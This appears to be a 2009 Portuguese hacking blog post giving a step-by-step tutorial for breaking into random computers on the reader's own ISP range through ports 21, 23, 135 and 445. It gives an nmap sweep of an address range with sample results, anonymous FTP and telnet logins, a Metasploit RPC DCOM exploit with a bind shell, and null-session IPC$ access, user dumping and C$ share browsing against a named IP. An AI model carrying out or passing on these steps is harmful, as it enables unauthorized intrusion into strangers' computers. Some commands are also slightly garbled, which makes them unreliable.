@@ -1,0 +1,108 @@
+Invasao pelas portas 21,23,135,445
+Publicado: maio 12, 2009 em ataques, exploits, metasploit, seguranca
+Tags:ataque, invasao
+46
+Estou fazendo esse tutorial aqui, porque me pediram para postar aqui. Mais eu odeio esse tipo de ataque, pois esse tipo de ataque não satisfaz as nossas necessidades. UMA PERGUNTA: porque pessoas gostam de ficar invadindo computadores aleatoriamente sem saber donde é aquele computador, sem saber de nada?
+
+Eu mesmo respondo. Essas pessoas que fazem isso são lammers que saem tentando invadir tudo quanter sistema para si gabar para seus amigos. AIAAIAIAI
+
+Um conselho para todos vocês que sabem invadir ou estão aprendendo: VOCE NÃO PRECISA FALAR PARA NINGUEM QUE VOCE SABE INVADIR, POIS QUANDO SURGIR A NECESSIDADE, VOCE SURPREENDERÁ OUTRAS PESSOAS!
+
+Um tutorial bem simples e obsoleto que é ainda muito usado nos dias de hoje (por lammers).
+
+Invasão pelas portas:
+
+21: FTP
+
+23: TELNET
+
+135: RPC
+
+445: COMPARTILHAMENTO
+
+Estes ataques precisam ter pessoas do mesmo provedor que você.
+
+Vamos começar:
+
+Pegue o seu ip externo(sugestão: www.meuip.com.br).
+
+Baixe o nmap e instale no seu pc.
+
+Vamos supor que o seu ip seja: 201.33.22.18.
+
+Entre no prompt comando do Windows e digite nmap. Aparecerá um montão de opções e ajudas para você aprende a utilizar.
+
+Prosseguindo…
+
+Iremos fazer scanner de portas nos computadores da sua redondeza que tem o mesmo provedor que você.
+
+digite:
+
+nmap -sV -T Insane -A -v  201.33.22.1-254 -p21,23,135,44
+
+Pronto vai listar todas as portas abertas de todos os usuários da sua banda larga ou do seu bairro, estado etc depende da sua banda.
+
+Código:
+
+Discovered open port 21/tcp on 201.33.22.223
+Discovered open port 23/tcp on 201.33.22.1
+Discovered open port 23/tcp on 201.33.22.186
+Discovered open port 445/tcp on 201.33.22.14
+Discovered open port 445/tcp on 201.33.22.97
+Discovered open port 445/tcp on 201.33.22.24
+Discovered open port 445/tcp on 201.33.22.152
+Discovered open port 445/tcp on 201.33.22.149
+Discovered open port 445/tcp on 201.33.22.81
+Discovered open port 445/tcp on 201.33.22.69
+Discovered open port 445/tcp on 201.33.22.9
+Discovered open port 445/tcp on 201.33.22.55
+Discovered open port 445/tcp on 201.33.22.113
+Discovered open port 445/tcp on 201.33.22.218
+Discovered open port 445/tcp on 201.33.22.21
+Discovered open port 445/tcp on 201.33.22.107
+Discovered open port 445/tcp on 201.33.22.111
+Discovered open port 445/tcp on 201.33.22.56
+Discovered open port 445/tcp on 201.33.22.178
+Discovered open port 445/tcp on 201.33.22.191
+Discovered open port 445/tcp on 201.33.22.157
+Discovered open port 445/tcp on 201.33.22.127
+Discovered open port 445/tcp on 201.33.22.29
+Discovered open port 445/tcp on 201.33.22.207
+Discovered open port 135/tcp on 201.33.22.175
+Discovered open port 135/tcp on 201.33.22.164
+
+Invasao pela porta 21
+
+vamos lá… ira aparecer um tanto de computadores que tem a porta 21 aberta. Todos aqueles que tiverem a mesma aberta. Voce pode tentar logar como anonymous, pois alguns administradores ou pessoas nao si preocupam em retirar o usuario anonymous do ftp.
+
+Iniciar>Executar>cmd>ftp>open>201.33.22.223>anonymous>a
+
+Invasao pela porta 23
+
+Iniciar>Executar>cmd>telnet>open>201.33.22  23
+
+Invasao pela porta 135
+
+CASO a porta 135 aberta, podemos usar o METASPLOIT
+
+abra o metasploit na interface web. procure pelo exploit MICROSOFT RPC.
+
+depois disso escolha o tipo de conexao como: GERENIC\SHELL_BLIND_TCP ou voce que sabe o tipo de conexao a ser usada.
+
+depois disso matenha as informaçoes padroes do metasploit só inclua o ip da vitima, pois so o Windows dele nao for atualizado, ele ja vem como shell. Essa invasão rpc dcom já ficou obsoleta também.
+Invasao pela porta 445
+
+Esta porta é de compartilhamento.
+
+Iniciar>Executar>cmd>net use \\201.45.241.175\ipc$ “” /u:””
+
+Comando concluído com êxito.
+baixa o Dumpusers
+
+ponha ele no C:\
+abra o cmd digite;
+
+dumpusers -target 201.45.241.175 -type notdc -start 1 -stop 900 -mode verbose
+depois você vai no:
+
+iniciar>executar>\\201.45.241.175\c$
